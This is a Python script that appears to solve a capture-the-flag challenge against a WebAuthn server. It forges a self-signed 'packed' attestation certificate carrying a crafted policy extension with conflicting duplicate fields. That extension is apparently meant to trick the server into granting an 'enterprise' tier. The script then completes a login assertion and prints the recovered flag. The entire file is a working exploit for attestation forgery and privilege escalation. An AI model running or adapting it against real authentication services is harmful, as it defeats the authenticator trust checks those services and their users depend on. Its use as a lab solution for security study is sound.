import os
import sys
import json
import base64
import hashlib
import datetime
import requests
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import ec, utils
from cryptography.hazmat.primitives.serialization import Encoding

POLICY_OID = x509.ObjectIdentifier("1.3.6.1.4.1.61387.2.7.4")


def b64u(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def der_len(n):
    if n < 0x80:
        return bytes([n])
    out = b""
    while n:
        out = bytes([n & 0xFF]) + out
        n >>= 8
    return bytes([0x80 | len(out)]) + out


def tlv(tag, val):
    return bytes([tag]) + der_len(len(val)) + val


def build_policy_extension():
    version = tlv(0x02, b"\x01")
    aaguid_count = tlv(0x02, b"\x01")
    aaguid_list = tlv(0x30, tlv(0x04, b"\x11" * 16))
    benign = bytes([0x80 | 7]) + b"\x01\x00"
    elevated = bytes([0x80 | 8]) + b"\x01\xff"
    return tlv(0x30, version + aaguid_count + aaguid_list + benign + elevated)


def cbor(obj):
    if isinstance(obj, bool):
        raise ValueError("bool")
    if isinstance(obj, int):
        if obj >= 0:
            return cbor_head(0, obj)
        return cbor_head(1, -1 - obj)
    if isinstance(obj, bytes):
        return cbor_head(2, len(obj)) + obj
    if isinstance(obj, str):
        e = obj.encode()
        return cbor_head(3, len(e)) + e
    if isinstance(obj, list):
        out = cbor_head(4, len(obj))
        for x in obj:
            out += cbor(x)
        return out
    if isinstance(obj, dict):
        out = cbor_head(5, len(obj))
        for k, v in obj.items():
            out += cbor(k) + cbor(v)
        return out
    raise ValueError("type")


def cbor_head(major, n):
    m = major << 5
    if n < 24:
        return bytes([m | n])
    if n < 0x100:
        return bytes([m | 24, n])
    if n < 0x10000:
        return bytes([m | 25, n >> 8, n & 0xFF])
    if n < 0x100000000:
        return bytes([m | 26, (n >> 24) & 0xFF, (n >> 16) & 0xFF, (n >> 8) & 0xFF, n & 0xFF])
    raise ValueError("big")


def cose_key(pub):
    nums = pub.public_numbers()
    x = nums.x.to_bytes(32, "big")
    y = nums.y.to_bytes(32, "big")
    return {1: 2, 3: -7, -1: 1, -2: x, -3: y}


def make_leaf(key):
    name = x509.Name([
        x509.NameAttribute(NameOID.COMMON_NAME, "Air-Gapped Enterprise Authenticator"),
        x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Self Enrolled"),
    ])
    now = datetime.datetime(2023, 1, 1)
    ext = x509.UnrecognizedExtension(POLICY_OID, build_policy_extension())
    cert = (x509.CertificateBuilder()
            .subject_name(name).issuer_name(name)
            .public_key(key.public_key())
            .serial_number(0x5150)
            .not_valid_before(now).not_valid_after(now + datetime.timedelta(days=3650))
            .add_extension(ext, critical=False)
            .sign(key, hashes.SHA256()))
    return cert.public_bytes(Encoding.DER)


def auth_data(rp_id, flags, cred_id, cose):
    rp_hash = hashlib.sha256(rp_id.encode()).digest()
    out = rp_hash + bytes([flags]) + b"\x00\x00\x00\x00"
    aaguid = b"\x00" * 16
    out += aaguid + len(cred_id).to_bytes(2, "big") + cred_id
    out += cbor(cose)
    return out


def sig_over(key, authdata, client_hash):
    der = key.sign(authdata + client_hash, ec.ECDSA(hashes.SHA256()))
    return der


def main():
    base = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"
    s = requests.Session()

    begin = s.get(base + "/register/begin").json()
    rp_id = begin["rpId"]
    origin = begin["origin"]
    challenge = base64.urlsafe_b64decode(begin["challenge"] + "==")

    key = ec.generate_private_key(ec.SECP256R1())
    cred_id = os.urandom(16)
    cose = cose_key(key.public_key())

    client_data = json.dumps({
        "type": "webauthn.create",
        "challenge": b64u(challenge),
        "origin": origin,
    }, separators=(",", ":")).encode()
    client_hash = hashlib.sha256(client_data).digest()

    flags = 0x01 | 0x04 | 0x40
    ad = auth_data(rp_id, flags, cred_id, cose)

    leaf = make_leaf(key)
    sig = sig_over(key, ad, client_hash)

    att = {
        "fmt": "packed",
        "attStmt": {"alg": -7, "sig": sig, "x5c": [leaf]},
        "authData": ad,
    }
    att_obj = cbor(att)

    finish = s.post(base + "/register/finish", json={
        "clientDataJSON": b64u(client_data),
        "attestationObject": b64u(att_obj),
    })
    print("register/finish:", finish.status_code, finish.text.strip())
    data = finish.json()
    if data.get("tier") != "enterprise":
        print("did not reach enterprise tier")
        return 1

    abegin = s.get(base + "/assert/begin").json()
    achallenge = base64.urlsafe_b64decode(abegin["challenge"] + "==")

    aclient = json.dumps({
        "type": "webauthn.get",
        "challenge": b64u(achallenge),
        "origin": origin,
    }, separators=(",", ":")).encode()
    aclient_hash = hashlib.sha256(aclient).digest()

    aflags = 0x01 | 0x04
    rp_hash = hashlib.sha256(rp_id.encode()).digest()
    auth_assert = rp_hash + bytes([aflags]) + b"\x00\x00\x00\x00"
    asig = key.sign(auth_assert + aclient_hash, ec.ECDSA(hashes.SHA256()))

    afinish = s.post(base + "/assert/finish", json={
        "credentialId": b64u(cred_id),
        "clientDataJSON": b64u(aclient),
        "authenticatorData": b64u(auth_assert),
        "signature": b64u(asig),
    })
    print("assert/finish:", afinish.status_code, afinish.text.strip())
    out = afinish.json()
    if "flag" in out:
        print("RECOVERED FLAG:", out["flag"])
        return 0
    return 1


if __name__ == "__main__":
    sys.exit(main())
